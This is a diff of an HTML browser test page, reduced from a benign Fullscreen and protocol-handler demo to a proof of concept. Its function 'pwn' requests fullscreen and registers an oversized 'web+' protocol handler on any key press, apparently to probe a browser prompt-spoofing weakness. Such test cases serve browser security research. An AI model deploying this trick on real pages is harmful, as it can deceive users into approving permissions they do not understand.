@@ -1,190 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Modern Browser API Test</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        padding: 20px;
-      }
-      button {
-        padding: 10px 20px;
-        margin: 10px 0;
-        font-size: 16px;
-        cursor: pointer;
-        display: block;
-      }
-      .info {
-        background: #f0f0f0;
-        padding: 15px;
-        margin: 10px 0;
-        border-radius: 5px;
-      }
-      .success {
-        color: green;
-      }
-      .error {
-        color: red;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>Modern Browser API Test</h1>
-
-    <div class="info">
-      <h3>Test 1: Fullscreen API (Modern)</h3>
-      <button id="btnFullscreen">Toggle Fullscreen</button>
-      <p id="statusFullscreen"></p>
-    </div>
-
-    <div class="info">
-      <h3>Test 2: Protocol Handler (Valid)</h3>
-      <button id="btnRegisterProtocol">Register Protocol Handler</button>
-      <button id="btnTestProtocol" disabled>Test Custom Protocol</button>
-      <p id="statusProtocol"></p>
-    </div>
-
-    <div class="info">
-      <h3>Test 3: Combined (Fullscreen + Protocol)</h3>
-      <button id="btnCombined">Fullscreen + Register Protocol</button>
-      <p id="statusCombined"></p>
-    </div>
-
-    <div class="info">
-      <h3>Test 4: Keyboard Trigger (Press 'F' key)</h3>
-      <p id="statusKeyboard">Waiting for 'F' key press...</p>
-    </div>
+</head>
+<body>
+    <button id="testBtn">Click to Test</button>
+    <div id="status"></div>
 
     <script>
-      // Test 1: Modern Fullscreen API
-      document
-        .getElementById("btnFullscreen")
-        .addEventListener("click", function () {
-          const status = document.getElementById("statusFullscreen");
-
-          if (!document.fullscreenElement) {
-            document.documentElement
-              .requestFullscreen()
-              .then(() => {
-                status.innerHTML =
-                  '<span class="success">✓ Fullscreen enabled</span>';
-              })
-              .catch((err) => {
-                status.innerHTML = `<span class="error">✗ Error: ${err.message}</span>`;
-              });
-          } else {
-            document
-              .exitFullscreen()
-              .then(() => {
-                status.innerHTML =
-                  '<span class="success">✓ Fullscreen exited</span>';
-              })
-              .catch((err) => {
-                status.innerHTML = `<span class="error">✗ Error: ${err.message}</span>`;
-              });
-          }
-        });
-
-      // Test 2: Protocol Handler (Valid Format)
-      document
-        .getElementById("btnRegisterProtocol")
-        .addEventListener("click", function () {
-          const status = document.getElementById("statusProtocol");
-          const testBtn = document.getElementById("btnTestProtocol");
-
-          try {
-            // Modern browser requires:
-            // 1. Protocol must start with 'web+'
-            // 2. URL must be HTTPS (in production)
-            // 3. URL must contain %s placeholder
-            // 4. Must be called from user gesture
-
-            const protocol = "web+myapp";
-            const url = window.location.origin + "/handler?url=%s";
-            const title = "My Custom App";
-
-            navigator.registerProtocolHandler(protocol, url, title);
-
-            status.innerHTML = `<span class="success">✓ Protocol registered: ${protocol}://</span>`;
-            testBtn.disabled = false;
-          } catch (err) {
-            status.innerHTML = `<span class="error">✗ Error: ${err.message}</span>`;
-          }
-        });
-
-      // Test Protocol Handler
-      document
-        .getElementById("btnTestProtocol")
-        .addEventListener("click", function () {
-          window.location.href = "web+myapp://test-data";
-        });
-
-      // Test 3: Combined
-      document
-        .getElementById("btnCombined")
-        .addEventListener("click", async function () {
-          const status = document.getElementById("statusCombined");
-
-          try {
-            // 1. Fullscreen first
-            await document.documentElement.requestFullscreen();
-            status.innerHTML =
-              '<span class="success">✓ Fullscreen enabled</span><br>';
-
-            // 2. Register protocol (must be in same user gesture)
-            setTimeout(() => {
-              try {
+        function pwn() {
+            // Modern Fullscreen API
+            document.documentElement.requestFullscreen().catch(err => {
+                console.log('Fullscreen error:', err);
+            });
+            
+            // Register Protocol Handler with long string
+            try {
                 navigator.registerProtocolHandler(
-                  "web+testapp",
-                  window.location.origin + "/handle?q=%s",
-                  "Test App"
+                    'web+' + 'o'.repeat(200), // Long protocol string
+                    location.href + '?handler=%s',
+                    'Test Handler'
                 );
-                status.innerHTML +=
-                  '<span class="success">✓ Protocol registered</span>';
-              } catch (err) {
-                status.innerHTML += `<span class="error">✗ Protocol error: ${err.message}</span>`;
-              }
-            }, 100);
-          } catch (err) {
-            status.innerHTML = `<span class="error">✗ Error: ${err.message}</span>`;
-          }
-        });
-
-      // Test 4: Keyboard Trigger (Modern approach)
-      let keyPressCount = 0;
-      document.addEventListener("keydown", function (event) {
-        const status = document.getElementById("statusKeyboard");
-
-        // Only trigger on 'F' key
-        if (event.key.toLowerCase() === "f") {
-          keyPressCount++;
-          status.innerHTML = `<span class="success">✓ 'F' key pressed (${keyPressCount}x) - Attempting fullscreen...</span>`;
-
-          // Modern browsers require explicit user gesture
-          // Keyboard events count as user gestures
-          if (!document.fullscreenElement) {
-            document.documentElement
-              .requestFullscreen()
-              .then(() => {
-                status.innerHTML +=
-                  '<br><span class="success">✓ Fullscreen enabled via keyboard</span>';
-              })
-              .catch((err) => {
-                status.innerHTML += `<br><span class="error">✗ Error: ${err.message}</span>`;
-              });
-          }
+            } catch(e) {
+                console.log('Protocol handler error:', e);
+            }
         }
-      });
 
-      // Monitor fullscreen changes
-      document.addEventListener("fullscreenchange", function () {
-        console.log(
-          "Fullscreen state:",
-          document.fullscreenElement ? "ACTIVE" : "INACTIVE"
-        );
-      });
+        // Trigger on button click (user gesture required for modern browsers)
+        document.getElementById('testBtn').addEventListener('click', pwn);
+        
+        // Also trigger on any keydown (like original)
+        document.addEventListener('keydown', function(e) {
+            pwn();
+            document.getElementById('status').textContent = 'Key pressed: ' + e.key;
+        });
     </script>
-  </body>
+</body>
 </html>
